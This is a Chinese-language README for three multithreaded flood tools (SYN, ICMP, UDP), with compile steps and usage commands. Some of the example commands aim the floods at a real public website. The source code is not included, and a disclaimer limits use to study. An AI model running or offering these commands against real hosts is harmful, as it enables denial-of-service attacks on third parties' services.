1.SYN-ATTACK
==========
作者: Xuebi

邮箱: 2685043624@qq.com

Created Time: 2020.01.07

##### 说明：
1.本程序采用多线程，模拟syn洪水进攻。
2.采用wireshack查看数据包

##### 使用:
```
$ gcc -o syn_attack syn_attack.c -lpthread
$ sudo ./syn_attack <IPaddress> <port>
```
例如
```
$ sudo ./syn_attack 0.0.0.0 80
$ sudo ./syn_attack www.pornhub.com 80
```



2.ICMP-ATTACK
==========
作者: Xuebi

邮箱: 2685043624@qq.com

Created Time: 2020.01.09

##### 说明：
1.本程序采用多线程，模拟icmp洪水进攻。
2.采用wireshack查看数据包

##### 使用:
```
$ gcc -o icmp_attack icmp_attack.c -lpthread
$ sudo ./icmp_attack <IPaddress>
```
例如
```
$ sudo ./icmp_attack 0.0.0.0 
$ sudo ./icmp_attack www.pornhub.com
```

##### Bug
1. 发送的数据包中，ICMP检验和一半的包正确，一半的包错误。

3.UDP-ATTACK
==========
作者: Xuebi

邮箱: 2685043624@qq.com

Created Time: 2020.01.07

##### 说明：
1.本程序采用多线程，模拟udp洪水进攻。
2.采用wireshack查看数据包

##### 使用:
```
$ gcc -o udp_attack udp_attack.c -lpthread
$ sudo ./udp_attack <IPaddress> <port>
```
例如
```
$ sudo ./udp_attack 0.0.0.0 80
$ sudo ./udp_attack www.pornhub.com 80
```


###注意：
-----
本代码仅供交流学习，不得进行非法用途。
